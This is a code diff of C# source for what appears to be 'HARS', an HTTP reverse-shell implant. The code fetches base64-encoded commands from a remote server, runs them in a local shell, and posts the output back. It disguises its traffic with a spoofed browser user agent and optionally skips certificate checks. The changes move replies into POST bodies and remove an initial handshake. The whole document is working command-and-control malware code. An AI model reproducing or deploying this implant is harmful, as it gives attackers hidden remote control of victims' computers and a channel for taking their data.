@@ -72,7 +72,7 @@ namespace HARS
             IO.stdout = "";
             IO.stderr = "";
             IO.firstline = true;
-            readProcess.StandardInput.WriteLine(cmd + " ; echo FLAG_END");
+            readProcess.StandardInput.WriteLine(cmd + " ; echo END_FLAG");
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -89,22 +89,19 @@ namespace HARS
                 if (Config.AllowInsecureCertificate)
                     ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                 ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url + Utility.RandomString()));
+                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url));
                 req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                 req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                 req.Headers.Add("Accept-Encoding","gzip, deflate, br");
-                req.Headers.Add("Cookie", Utility.Base64Encode("ASK"));
                 HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                 using (Stream stream = resp.GetResponseStream())
                 {
                     StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                     responseString = reader.ReadToEnd();
                 }
-                int lastindex = responseString.LastIndexOf(">");
-                if (lastindex != responseString.Length)
+                if (responseString.Length != 0)
                 {
-                    cmd = responseString.Substring(lastindex + 1, responseString.Length - lastindex - 1);
-                    cmd = Utility.Base64Decode(cmd);
+                    cmd = Utility.Base64Decode(responseString);
                 }
                 return true;
             }
@@ -123,11 +120,15 @@ namespace HARS
                 if (Config.AllowInsecureCertificate)
                     ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                 ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url + Utility.RandomString()));
+                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url));
+                req.Method = "POST";
                 req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                 req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                 req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
-                req.Headers.Add("Cookie", Utility.Base64Encode(reply));
+                byte[] arr = Encoding.ASCII.GetBytes(Utility.Base64Encode(reply));
+                req.ContentLength = arr.Length;
+                Stream dataStream = req.GetRequestStream();
+                dataStream.Write(arr, 0, arr.Length);
                 HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                 using (Stream stream = resp.GetResponseStream())
                 {
@@ -142,45 +143,15 @@ namespace HARS
             }
         }
 
-        // First connection to server
-        private bool Init()
-        {
-            String responseString;
-            try
-            {
-                if (Config.AllowInsecureCertificate)
-                    ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
-                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url + Utility.RandomString()));
-                req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
-                req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
-                req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
-                req.Headers.Add("Cookie", Utility.Base64Encode("HELLO"));
-                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
-                using (Stream stream = resp.GetResponseStream())
-                {
-                    StreamReader reader = new StreamReader(stream, Encoding.UTF8);
-                    responseString = reader.ReadToEnd();
-                }
-                if (responseString.Contains(Utility.Base64Encode("HELLO")))
-                    return true;
-                return false;
-            }
-            catch
-            {
-                return false;
-            }
-        }
-
         private void Main_Load(object sender, EventArgs e)
         {
 
             // Initialise connection to server
-            if (!Init())
+            /*if (!Init())
             {
                 // Exit if server dont reply "hello"
                 Environment.Exit(0);
-            }
+            }*/
             // Acting forever..
             while (true)
             {
@@ -207,7 +178,7 @@ namespace HARS
                             Environment.Exit(0);
                         }
                         Exec(cmd);
-                        while (!IO.stderr.Contains("FLAG_END") && !IO.stdout.Contains("FLAG_END"))
+                        while (!IO.stderr.Contains("END_FLAG") && !IO.stdout.Contains("END_FLAG"))
                         {
                             Thread.Sleep(100);
                         }
@@ -227,7 +198,7 @@ namespace HARS
                             }
                             reply = IO.stdout;
                         }
-                        reply = reply.Replace("FLAG_END", "");
+                        reply = reply.Replace("  ; echo END_FLAG", "");
                         ReplyCmd();
                         IO.stdout = "";
                         IO.stderr = "";
